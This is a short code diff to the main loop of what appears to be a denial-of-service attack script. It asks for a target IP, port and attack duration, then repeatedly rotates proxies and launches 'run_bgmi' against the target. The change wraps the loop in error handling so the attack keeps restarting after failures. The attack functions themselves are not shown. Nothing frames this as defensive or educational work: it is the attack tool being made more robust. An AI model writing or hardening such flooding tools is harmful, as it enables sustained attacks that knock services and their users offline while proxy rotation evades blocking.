@@ -75,10 +75,13 @@ if __name__ == "__main__":
     target_ip = input("Enter Target IP: ").strip()
     target_port = input("Enter Target Port: ").strip()
     attack_time = input("Enter Attack Time (seconds): ").strip()
-    
 
     while True:
-        rotate_proxies()
-        run_bgmi(target_ip, target_port, attack_time)
-        print(f"[*] Sleeping {ROTATE_INTERVAL} seconds before next round...\n")
-        time.sleep(ROTATE_INTERVAL)
+        try:
+            rotate_proxies()
+            run_bgmi(target_ip, target_port, attack_time)
+            print(f"[*] Sleeping {ROTATE_INTERVAL} seconds before next round...\n")
+            time.sleep(ROTATE_INTERVAL)
+        except Exception as e:
+            print(f"[!] Error occurred: {e}. Restarting...")
+            time.sleep(5)  # Add a small delay before restarting the loop
